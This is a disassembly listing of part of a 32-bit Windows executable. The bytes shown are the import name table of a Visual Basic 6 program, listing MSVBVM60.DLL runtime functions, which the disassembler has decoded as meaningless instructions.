  406444:	56                   	push   %esi
  406445:	4d                   	dec    %ebp
  406446:	36 30 2e             	xor    %ch,%ss:(%esi)
  406449:	44                   	inc    %esp
  40644a:	4c                   	dec    %esp
  40644b:	4c                   	dec    %esp
  40644c:	00 00                	add    %al,(%eax)
  40644e:	53                   	push   %ebx
  40644f:	00 5f 43             	add    %bl,0x43(%edi)
  406452:	49                   	dec    %ecx
  406453:	63 6f 73             	arpl   %ebp,0x73(%edi)
  406456:	00 00                	add    %al,(%eax)
  406458:	b3 01                	mov    $0x1,%bl
  40645a:	5f                   	pop    %edi
  40645b:	61                   	popa
  40645c:	64 6a 5f             	fs push $0x5f
  40645f:	66 70 74             	data16 jo 0x4064d6
  406462:	61                   	popa
  406463:	6e                   	outsb  %ds:(%esi),(%dx)
  406464:	00 00                	add    %al,(%eax)
  406466:	48                   	dec    %eax
  406467:	01 5f 5f             	add    %ebx,0x5f(%edi)
  40646a:	76 62                	jbe    0x4064ce
  40646c:	61                   	popa
  40646d:	53                   	push   %ebx
  40646e:	74 72                	je     0x4064e2
  406470:	56                   	push   %esi
  406471:	61                   	popa
  406472:	72 4d                	jb     0x4064c1
  406474:	6f                   	outsl  %ds:(%esi),(%dx)
  406475:	76 65                	jbe    0x4064dc
  406477:	00 e9                	add    %ch,%cl
  406479:	00 5f 5f             	add    %bl,0x5f(%edi)
  40647c:	76 62                	jbe    0x4064e0
  40647e:	61                   	popa
  40647f:	4c                   	dec    %esp
  406480:	65 6e                	outsb  %gs:(%esi),(%dx)
  406482:	42                   	inc    %edx
  406483:	73 74                	jae    0x4064f9
  406485:	72 00                	jb     0x406487
  406487:	00 b2 00 5f 5f 76    	add    %dh,0x765f5f00(%edx)
  40648d:	62 61 46             	bound  %esp,0x46(%ecx)
  406490:	72 65                	jb     0x4064f7
  406492:	65 56                	gs push %esi
  406494:	61                   	popa
  406495:	72 4c                	jb     0x4064e3
  406497:	69 73 74 00 00 aa 01 	imul   $0x1aa0000,0x74(%ebx),%esi
  40649e:	5f                   	pop    %edi
  40649f:	61                   	popa
  4064a0:	64 6a 5f             	fs push $0x5f
  4064a3:	66 64 69 76 5f 6d 36 	imul   $0x366d,%fs:0x5f(%esi),%si
  4064aa:	34 00                	xor    $0x0,%al
  4064ac:	ae                   	scas   %es:(%edi),%al
  4064ad:	00 5f 5f             	add    %bl,0x5f(%edi)
  4064b0:	76 62                	jbe    0x406514
  4064b2:	61                   	popa
  4064b3:	46                   	inc    %esi
  4064b4:	72 65                	jb     0x40651b
  4064b6:	65 4f                	gs dec %edi
  4064b8:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  4064bb:	69 73 74 00 00 b2 01 	imul   $0x1b20000,0x74(%ebx),%esi
  4064c2:	5f                   	pop    %edi
  4064c3:	61                   	popa
  4064c4:	64 6a 5f             	fs push $0x5f
  4064c7:	66 70 72             	data16 jo 0x40653c
  4064ca:	65 6d                	gs insl (%dx),%es:(%edi)
  4064cc:	31 00                	xor    %eax,(%eax)
  4064ce:	33 01                	xor    (%ecx),%eax
  4064d0:	5f                   	pop    %edi
  4064d1:	5f                   	pop    %edi
  4064d2:	76 62                	jbe    0x406536
  4064d4:	61                   	popa
  4064d5:	53                   	push   %ebx
  4064d6:	74 72                	je     0x40654a
  4064d8:	43                   	inc    %ebx
  4064d9:	61                   	popa
  4064da:	74 00                	je     0x4064dc
  4064dc:	2d 01 5f 5f 76       	sub    $0x765f5f01,%eax
  4064e1:	62 61 53             	bound  %esp,0x53(%ecx)
  4064e4:	65 74 53             	gs je  0x40653a
  4064e7:	79 73                	jns    0x40655c
  4064e9:	74 65                	je     0x406550
  4064eb:	6d                   	insl   (%dx),%es:(%edi)
  4064ec:	45                   	inc    %ebp
  4064ed:	72 72                	jb     0x406561
  4064ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4064f0:	72 00                	jb     0x4064f2
  4064f2:	c0 00 5f             	rolb   $0x5f,(%eax)
  4064f5:	5f                   	pop    %edi
  4064f6:	76 62                	jbe    0x40655a
  4064f8:	61                   	popa
  4064f9:	48                   	dec    %eax
  4064fa:	72 65                	jb     0x406561
  4064fc:	73 75                	jae    0x406573
  4064fe:	6c                   	insb   (%dx),%es:(%edi)
  4064ff:	74 43                	je     0x406544
  406501:	68 65 63 6b 4f       	push   $0x4f6b6365
  406506:	62 6a 00             	bound  %ebp,0x0(%edx)
  406509:	00 a8 01 5f 61 64    	add    %ch,0x64615f01(%eax)
  40650f:	6a 5f                	push   $0x5f
  406511:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  406518:	32 00                	xor    (%eax),%al
  40651a:	ff 00                	incl   (%eax)
  40651c:	5f                   	pop    %edi
  40651d:	5f                   	pop    %edi
  40651e:	76 62                	jbe    0x406582
  406520:	61                   	popa
  406521:	4f                   	dec    %edi
  406522:	62 6a 53             	bound  %ebp,0x53(%edx)
  406525:	65 74 00             	gs je  0x406528
  406528:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406529:	01 5f 61             	add    %ebx,0x61(%edi)
  40652c:	64 6a 5f             	fs push $0x5f
  40652f:	66 64 69 76 5f 6d 31 	imul   $0x316d,%fs:0x5f(%esi),%si
  406536:	36 69 00 00 ac 01 5f 	imul   $0x5f01ac00,%ss:(%eax),%eax
  40653d:	61                   	popa
  40653e:	64 6a 5f             	fs push $0x5f
  406541:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  406548:	31 36                	xor    %esi,(%esi)
  40654a:	69 00 56 00 5f 43    	imul   $0x435f0056,(%eax),%eax
  406550:	49                   	dec    %ecx
  406551:	73 69                	jae    0x4065bc
  406553:	6e                   	outsb  %ds:(%esi),(%dx)
  406554:	00 00                	add    %al,(%eax)
  406556:	6f                   	outsl  %ds:(%esi),(%dx)
  406557:	00 5f 5f             	add    %bl,0x5f(%edi)
  40655a:	76 62                	jbe    0x4065be
  40655c:	61                   	popa
  40655d:	43                   	inc    %ebx
  40655e:	68 6b 73 74 6b       	push   $0x6b74736b
  406563:	00 11                	add    %dl,(%ecx)
  406565:	00 45 56             	add    %al,0x56(%ebp)
  406568:	45                   	inc    %ebp
  406569:	4e                   	dec    %esi
  40656a:	54                   	push   %esp
  40656b:	5f                   	pop    %edi
  40656c:	53                   	push   %ebx
  40656d:	49                   	dec    %ecx
  40656e:	4e                   	dec    %esi
  40656f:	4b                   	dec    %ebx
  406570:	5f                   	pop    %edi
  406571:	41                   	inc    %ecx
  406572:	64 64 52             	fs fs push %edx
  406575:	65 66 00 34 01       	data16 add %dh,%gs:(%ecx,%eax,1)
  40657a:	5f                   	pop    %edi
  40657b:	5f                   	pop    %edi
  40657c:	76 62                	jbe    0x4065e0
  40657e:	61                   	popa
  40657f:	53                   	push   %ebx
  406580:	74 72                	je     0x4065f4
  406582:	43                   	inc    %ebx
  406583:	6d                   	insl   (%dx),%es:(%edi)
  406584:	70 00                	jo     0x406586
  406586:	0b 00                	or     (%eax),%eax
  406588:	44                   	inc    %esp
  406589:	6c                   	insb   (%dx),%es:(%edi)
  40658a:	6c                   	insb   (%dx),%es:(%edi)
  40658b:	46                   	inc    %esi
  40658c:	75 6e                	jne    0x4065fc
  40658e:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  406592:	6e                   	outsb  %ds:(%esi),(%dx)
  406593:	43                   	inc    %ebx
  406594:	61                   	popa
  406595:	6c                   	insb   (%dx),%es:(%edi)
  406596:	6c                   	insb   (%dx),%es:(%edi)
  406597:	00 b0 01 5f 61 64    	add    %dh,0x64615f01(%eax)
  40659d:	6a 5f                	push   $0x5f
  40659f:	66 70 61             	data16 jo 0x406603
  4065a2:	74 61                	je     0x406605
  4065a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4065a5:	00 15 00 45 56 45    	add    %dl,0x45564500
  4065ab:	4e                   	dec    %esi
  4065ac:	54                   	push   %esp
  4065ad:	5f                   	pop    %edi
  4065ae:	53                   	push   %ebx
  4065af:	49                   	dec    %ecx
  4065b0:	4e                   	dec    %esi
  4065b1:	4b                   	dec    %ebx
  4065b2:	5f                   	pop    %edi
  4065b3:	52                   	push   %edx
  4065b4:	65 6c                	gs insb (%dx),%es:(%edi)
  4065b6:	65 61                	gs popa
  4065b8:	73 65                	jae    0x40661f
  4065ba:	00 00                	add    %al,(%eax)
  4065bc:	57                   	push   %edi
  4065bd:	00 5f 43             	add    %bl,0x43(%edi)
  4065c0:	49                   	dec    %ecx
  4065c1:	73 71                	jae    0x406634
  4065c3:	72 74                	jb     0x406639
  4065c5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4065c8:	45                   	inc    %ebp
  4065c9:	56                   	push   %esi
  4065ca:	45                   	inc    %ebp
  4065cb:	4e                   	dec    %esi
  4065cc:	54                   	push   %esp
  4065cd:	5f                   	pop    %edi
  4065ce:	53                   	push   %ebx
  4065cf:	49                   	dec    %ecx
  4065d0:	4e                   	dec    %esi
  4065d1:	4b                   	dec    %ebx
  4065d2:	5f                   	pop    %edi
  4065d3:	51                   	push   %ecx
  4065d4:	75 65                	jne    0x40663b
  4065d6:	72 79                	jb     0x406651
  4065d8:	49                   	dec    %ecx
  4065d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065da:	74 65                	je     0x406641
  4065dc:	72 66                	jb     0x406644
  4065de:	61                   	popa
  4065df:	63 65 00             	arpl   %esp,0x0(%ebp)
  4065e2:	8e 00                	mov    (%eax),%es
  4065e4:	5f                   	pop    %edi
  4065e5:	5f                   	pop    %edi
  4065e6:	76 62                	jbe    0x40664a
  4065e8:	61                   	popa
  4065e9:	45                   	inc    %ebp
  4065ea:	78 63                	js     0x40664f
  4065ec:	65 70 74             	gs jo  0x406663
  4065ef:	48                   	dec    %eax
  4065f0:	61                   	popa
  4065f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4065f2:	64 6c                	fs insb (%dx),%es:(%edi)
  4065f4:	65 72 00             	gs jb  0x4065f7
  4065f7:	00 b1 01 5f 61 64    	add    %dh,0x64615f01(%ecx)
  4065fd:	6a 5f                	push   $0x5f
  4065ff:	66 70 72             	data16 jo 0x406674
  406602:	65 6d                	gs insl (%dx),%es:(%edi)
  406604:	00 00                	add    %al,(%eax)
  406606:	af                   	scas   %es:(%edi),%eax
  406607:	01 5f 61             	add    %ebx,0x61(%edi)
  40660a:	64 6a 5f             	fs push $0x5f
  40660d:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  406614:	36 34 00             	ss xor $0x0,%al
  406617:	00 93 00 5f 5f 76    	add    %dl,0x765f5f00(%ebx)
  40661d:	62 61 46             	bound  %esp,0x46(%ecx)
  406620:	50                   	push   %eax
  406621:	45                   	inc    %ebp
  406622:	78 63                	js     0x406687
  406624:	65 70 74             	gs jo  0x40669b
  406627:	69 6f 6e 00 00 49 01 	imul   $0x1490000,0x6e(%edi),%ebp
  40662e:	5f                   	pop    %edi
  40662f:	5f                   	pop    %edi
  406630:	76 62                	jbe    0x406694
  406632:	61                   	popa
  406633:	53                   	push   %ebx
  406634:	74 72                	je     0x4066a8
  406636:	56                   	push   %esi
  406637:	61                   	popa
  406638:	72 56                	jb     0x406690
  40663a:	61                   	popa
  40663b:	6c                   	insb   (%dx),%es:(%edi)
  40663c:	00 00                	add    %al,(%eax)
  40663e:	58                   	pop    %eax
  40663f:	01 5f 5f             	add    %ebx,0x5f(%edi)
  406642:	76 62                	jbe    0x4066a6
  406644:	61                   	popa
  406645:	56                   	push   %esi
  406646:	61                   	popa
  406647:	72 43                	jb     0x40668c
  406649:	61                   	popa
  40664a:	74 00                	je     0x40664c
  40664c:	55                   	push   %ebp
  40664d:	00 5f 43             	add    %bl,0x43(%edi)
  406650:	49                   	dec    %ecx
  406651:	6c                   	insb   (%dx),%es:(%edi)
  406652:	6f                   	outsl  %ds:(%esi),(%dx)
  406653:	67 00 00             	add    %al,(%bx,%si)
  406656:	8d 00                	lea    (%eax),%eax
  406658:	5f                   	pop    %edi
  406659:	5f                   	pop    %edi
  40665a:	76 62                	jbe    0x4066be
  40665c:	61                   	popa
  40665d:	45                   	inc    %ebp
  40665e:	72 72                	jb     0x4066d2
  406660:	6f                   	outsl  %ds:(%esi),(%dx)
  406661:	72 4f                	jb     0x4066b2
  406663:	76 65                	jbe    0x4066ca
  406665:	72 66                	jb     0x4066cd
  406667:	6c                   	insb   (%dx),%es:(%edi)
  406668:	6f                   	outsl  %ds:(%esi),(%dx)
  406669:	77 00                	ja     0x40666b
  40666b:	00 f7                	add    %dh,%bh
  40666d:	00 5f 5f             	add    %bl,0x5f(%edi)
  406670:	76 62                	jbe    0x4066d4
  406672:	61                   	popa
  406673:	4e                   	dec    %esi
  406674:	65 77 32             	gs ja  0x4066a9
  406677:	00 a9 01 5f 61 64    	add    %ch,0x64615f01(%ecx)
  40667d:	6a 5f                	push   $0x5f
  40667f:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  406686:	32 69 00             	xor    0x0(%ecx),%ch
  406689:	00 ae 01 5f 61 64    	add    %ch,0x64615f01(%esi)
  40668f:	6a 5f                	push   $0x5f
  406691:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  406698:	33 32                	xor    (%edx),%esi
  40669a:	69 00 37 01 5f 5f    	imul   $0x5f5f0137,(%eax),%eax
  4066a0:	76 62                	jbe    0x406704
  4066a2:	61                   	popa
  4066a3:	53                   	push   %ebx
  4066a4:	74 72                	je     0x406718
  4066a6:	43                   	inc    %ebx
  4066a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4066a8:	70 79                	jo     0x406723
  4066aa:	00 00                	add    %al,(%eax)
  4066ac:	b0 00                	mov    $0x0,%al
  4066ae:	5f                   	pop    %edi
  4066af:	5f                   	pop    %edi
  4066b0:	76 62                	jbe    0x406714
  4066b2:	61                   	popa
  4066b3:	46                   	inc    %esi
  4066b4:	72 65                	jb     0x40671b
  4066b6:	65 53                	gs push %ebx
  4066b8:	74 72                	je     0x40672c
  4066ba:	4c                   	dec    %esp
  4066bb:	69 73 74 00 00 ad 01 	imul   $0x1ad0000,0x74(%ebx),%esi
  4066c2:	5f                   	pop    %edi
  4066c3:	61                   	popa
  4066c4:	64 6a 5f             	fs push $0x5f
  4066c7:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  4066ce:	33 32                	xor    (%edx),%esi
  4066d0:	00 00                	add    %al,(%eax)
  4066d2:	ab                   	stos   %eax,%es:(%edi)
  4066d3:	01 5f 61             	add    %ebx,0x61(%edi)
  4066d6:	64 6a 5f             	fs push $0x5f
  4066d9:	66 64 69 76 5f 72 00 	imul   $0x72,%fs:0x5f(%esi),%si
  4066e0:	62 01                	bound  %eax,(%ecx)
  4066e2:	5f                   	pop    %edi
  4066e3:	5f                   	pop    %edi
  4066e4:	76 62                	jbe    0x406748
  4066e6:	61                   	popa
  4066e7:	56                   	push   %esi
  4066e8:	61                   	popa
  4066e9:	72 44                	jb     0x40672f
  4066eb:	75 70                	jne    0x40675d
  4066ed:	00 44 01 5f          	add    %al,0x5f(%ecx,%eax,1)
  4066f1:	5f                   	pop    %edi
  4066f2:	76 62                	jbe    0x406756
  4066f4:	61                   	popa
  4066f5:	53                   	push   %ebx
  4066f6:	74 72                	je     0x40676a
  4066f8:	54                   	push   %esp
  4066f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4066fa:	41                   	inc    %ecx
  4066fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4066fc:	73 69                	jae    0x406767
  4066fe:	00 00                	add    %al,(%eax)
  406700:	52                   	push   %edx
  406701:	00 5f 43             	add    %bl,0x43(%edi)
  406704:	49                   	dec    %ecx
  406705:	61                   	popa
  406706:	74 61                	je     0x406769
  406708:	6e                   	outsb  %ds:(%esi),(%dx)
  406709:	00 3f                	add    %bh,(%edi)
  40670b:	01 5f 5f             	add    %ebx,0x5f(%edi)
  40670e:	76 62                	jbe    0x406772
  406710:	61                   	popa
  406711:	53                   	push   %ebx
  406712:	74 72                	je     0x406786
  406714:	4d                   	dec    %ebp
  406715:	6f                   	outsl  %ds:(%esi),(%dx)
  406716:	76 65                	jbe    0x40677d
  406718:	00 00                	add    %al,(%eax)
  40671a:	b4 01                	mov    $0x1,%ah
  40671c:	5f                   	pop    %edi
  40671d:	61                   	popa
  40671e:	6c                   	insb   (%dx),%es:(%edi)
  40671f:	6c                   	insb   (%dx),%es:(%edi)
  406720:	6d                   	insl   (%dx),%es:(%edi)
  406721:	75 6c                	jne    0x40678f
  406723:	00 58 00             	add    %bl,0x0(%eax)
  406726:	5f                   	pop    %edi
  406727:	43                   	inc    %ebx
  406728:	49                   	dec    %ecx
  406729:	74 61                	je     0x40678c
  40672b:	6e                   	outsb  %ds:(%esi),(%dx)
  40672c:	00 00                	add    %al,(%eax)
  40672e:	54                   	push   %esp
  40672f:	00 5f 43             	add    %bl,0x43(%edi)
  406732:	49                   	dec    %ecx
  406733:	65 78 70             	gs js  0x4067a6
  406736:	00 00                	add    %al,(%eax)
  406738:	ad                   	lods   %ds:(%esi),%eax
  406739:	00 5f 5f             	add    %bl,0x5f(%edi)
  40673c:	76 62                	jbe    0x4067a0
  40673e:	61                   	popa
  40673f:	46                   	inc    %esi
  406740:	72 65                	jb     0x4067a7
  406742:	65 4f                	gs dec %edi
  406744:	62 6a 00             	bound  %ebp,0x0(%edx)
  406747:	00 af 00 5f 5f 76    	add    %ch,0x765f5f00(%edi)
  40674d:	62 61 46             	bound  %esp,0x46(%ecx)
  406750:	72 65                	jb     0x4067b7
  406752:	65 53                	gs push %ebx
  406754:	74 72                	je     0x4067c8
	...
